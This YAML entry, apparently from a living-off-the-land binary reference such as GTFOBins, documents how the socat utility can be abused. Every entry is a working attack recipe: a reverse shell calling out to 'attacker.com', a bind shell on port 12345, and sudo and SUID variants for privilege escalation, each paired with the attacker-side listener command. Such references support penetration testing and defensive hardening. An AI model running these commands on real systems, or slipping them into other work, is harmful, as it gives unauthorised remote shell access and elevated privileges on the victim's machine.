---
functions:
  reverse-shell:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
  bind-shell:
    - description: Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.
      code: |
        LPORT=12345
        socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
  sudo:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        sudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
  limited-suid:
    - description: Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.
      code: |
        RHOST=attacker.com
        RPORT=12345
        ./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
---
